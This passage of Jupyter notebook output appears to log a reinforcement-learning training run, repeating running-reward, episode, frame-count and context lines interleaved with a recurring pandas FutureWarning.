      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 50\t Frame count: 23500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 50\t Frame count: 23600\t Context: 1\n",
      "Running reward: 11.00\t Episode 50\t Frame count: 23700\t Context: 1\n",
      "Running reward: 11.00\t Episode 51\t Frame count: 23800\t Context: 2\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 23900\t Context: 1\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 24000\t Context: 2\n",
      "Running reward: 11.00\t Episode 52\t Frame count: 24100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 52\t Frame count: 24200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 53\t Frame count: 24300\t Context: 2\n",
      "Running reward: 11.00\t Episode 53\t Frame count: 24400\t Context: 2\n",
      "Running reward: 11.00\t Episode 54\t Frame count: 24500\t Context: 1\n",
      "Running reward: 11.00\t Episode 54\t Frame count: 24600\t Context: 2\n",
      "Running reward: 11.00\t Episode 54\t Frame count: 24700\t Context: 2\n",
      "Running reward: 11.00\t Episode 54\t Frame count: 24800\t Context: 2\n",
      "Running reward: 11.00\t Episode 54\t Frame count: 24900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 55\t Frame count: 25000\t Context: 1\n",
      "Running reward: 11.00\t Episode 55\t Frame count: 25100\t Context: 1\n",
      "Running reward: 11.00\t Episode 55\t Frame count: 25200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 56\t Frame count: 25300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 56\t Frame count: 25400\t Context: 1\n",
      "Running reward: 11.00\t Episode 56\t Frame count: 25500\t Context: 2\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 25600\t Context: 1\n",
      "Running reward: 11.00\t Episode 57\t Frame count: 25700\t Context: 2\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 25800\t Context: 2\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 25900\t Context: 2\n",
      "Running reward: 11.00\t Episode 58\t Frame count: 26000\t Context: 2\n",
      "Running reward: 11.00\t Episode 59\t Frame count: 26100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 59\t Frame count: 26200\t Context: 1\n",
      "Running reward: 11.00\t Episode 59\t Frame count: 26300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 59\t Frame count: 26400\t Context: 1\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 26500\t Context: 1\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 26600\t Context: 2\n",
      "Running reward: 11.00\t Episode 61\t Frame count: 26700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 61\t Frame count: 26800\t Context: 1\n",
      "Running reward: 11.00\t Episode 61\t Frame count: 26900\t Context: 2\n",
      "Running reward: 11.00\t Episode 61\t Frame count: 27000\t Context: 2\n",
      "Running reward: 11.00\t Episode 61\t Frame count: 27100\t Context: 2\n",
      "Running reward: 11.00\t Episode 62\t Frame count: 27200\t Context: 1\n",
      "Running reward: 11.00\t Episode 62\t Frame count: 27300\t Context: 1\n",
      "Running reward: 11.00\t Episode 62\t Frame count: 27400\t Context: 1\n",
      "Running reward: 11.00\t Episode 62\t Frame count: 27500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 62\t Frame count: 27600\t Context: 1\n",
      "Running reward: 11.00\t Episode 62\t Frame count: 27700\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 27800\t Context: 1\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 27900\t Context: 1\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 28000\t Context: 1\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 28100\t Context: 1\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 28200\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 28300\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 28400\t Context: 2\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 28500\t Context: 1\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 28600\t Context: 1\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 28700\t Context: 1\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 28800\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 28900\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 29000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 66\t Frame count: 29100\t Context: 1\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 29200\t Context: 1\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 29300\t Context: 1\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 29400\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 29500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 67\t Frame count: 29600\t Context: 1\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 29700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 67\t Frame count: 29800\t Context: 1\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 29900\t Context: 1\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 30000\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 30100\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 30200\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 30300\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 30400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 67\t Frame count: 30500\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 30600\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 30700\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 30800\t Context: 2\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 30900\t Context: 1\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 31000\t Context: 2\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 31100\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 31200\t Context: 1\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 31300\t Context: 1\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 31400\t Context: 1\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 31500\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 31600\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 31700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 69\t Frame count: 31800\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 31900\t Context: 2\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 32000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 70\t Frame count: 32100\t Context: 1\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 32200\t Context: 2\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 32300\t Context: 2\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 32400\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 32500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 71\t Frame count: 32600\t Context: 1\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 32700\t Context: 1\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 32800\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 32900\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 33000\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 33100\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 33200\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 33300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 72\t Frame count: 33400\t Context: 1\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 33500\t Context: 1\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 33600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 72\t Frame count: 33700\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 33800\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 33900\t Context: 1\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 34000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 34100\t Context: 2\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 34200\t Context: 1\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 34300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 74\t Frame count: 34400\t Context: 1\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 34500\t Context: 1\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 34600\t Context: 1\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 34700\t Context: 1\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 34800\t Context: 1\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 34900\t Context: 2\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 35000\t Context: 2\n",
      "Running reward: 11.00\t Episode 75\t Frame count: 35100\t Context: 1\n",
      "Running reward: 11.00\t Episode 75\t Frame count: 35200\t Context: 1\n",
      "Running reward: 11.00\t Episode 75\t Frame count: 35300\t Context: 1\n",
      "Running reward: 11.00\t Episode 75\t Frame count: 35400\t Context: 1\n",
      "Running reward: 11.00\t Episode 75\t Frame count: 35500\t Context: 2\n",
      "Running reward: 11.00\t Episode 75\t Frame count: 35600\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 35700\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 35800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 76\t Frame count: 35900\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 36000\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 36100\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 36200\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 36300\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 36400\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 36500\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 36600\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 36700\t Context: 2\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 36800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 77\t Frame count: 36900\t Context: 1\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 37000\t Context: 1\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 37100\t Context: 1\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 37200\t Context: 1\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 37300\t Context: 2\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 37400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 78\t Frame count: 37500\t Context: 1\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 37600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 78\t Frame count: 37700\t Context: 1\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 37800\t Context: 1\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 37900\t Context: 2\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 38000\t Context: 2\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 38100\t Context: 2\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 38200\t Context: 2\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 38300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 79\t Frame count: 38400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 79\t Frame count: 38500\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 38600\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 38700\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 38800\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 38900\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 39000\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 39100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 79\t Frame count: 39200\t Context: 2\n",
      "Running reward: 11.00\t Episode 80\t Frame count: 39300\t Context: 1\n",
      "Running reward: 11.00\t Episode 80\t Frame count: 39400\t Context: 2\n",
      "Running reward: 11.00\t Episode 81\t Frame count: 39500\t Context: 1\n",
      "Running reward: 11.00\t Episode 81\t Frame count: 39600\t Context: 2\n",
      "Running reward: 11.00\t Episode 82\t Frame count: 39700\t Context: 1\n",
      "Running reward: 11.00\t Episode 83\t Frame count: 39800\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 39900\t Context: 1\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 40000\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 40100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 85\t Frame count: 40200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 85\t Frame count: 40300\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 40400\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 40500\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 40600\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 40700\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 40800\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 40900\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 41000\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 41100\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 41200\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 41300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 85\t Frame count: 41400\t Context: 1\n",
      "Running reward: 11.00\t Episode 86\t Frame count: 41500\t Context: 2\n",
      "Running reward: 11.00\t Episode 86\t Frame count: 41600\t Context: 2\n",
      "Running reward: 11.00\t Episode 86\t Frame count: 41700\t Context: 2\n",
      "Running reward: 11.00\t Episode 86\t Frame count: 41800\t Context: 2\n",
      "Running reward: 11.00\t Episode 87\t Frame count: 41900\t Context: 1\n",
      "Running reward: 11.00\t Episode 87\t Frame count: 42000\t Context: 1\n",
      "Running reward: 11.00\t Episode 87\t Frame count: 42100\t Context: 1\n",
      "Running reward: 11.00\t Episode 87\t Frame count: 42200\t Context: 1\n",
      "Running reward: 11.00\t Episode 87\t Frame count: 42300\t Context: 1\n",
      "Running reward: 11.00\t Episode 87\t Frame count: 42400\t Context: 1\n",
      "Running reward: 11.00\t Episode 88\t Frame count: 42500\t Context: 1\n",
      "Running reward: 11.00\t Episode 88\t Frame count: 42600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 88\t Frame count: 42700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 89\t Frame count: 42800\t Context: 1\n",
      "Running reward: 11.00\t Episode 89\t Frame count: 42900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 89\t Frame count: 43000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 89\t Frame count: 43100\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 43200\t Context: 1\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 43300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 90\t Frame count: 43400\t Context: 1\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 43500\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 43600\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 43700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
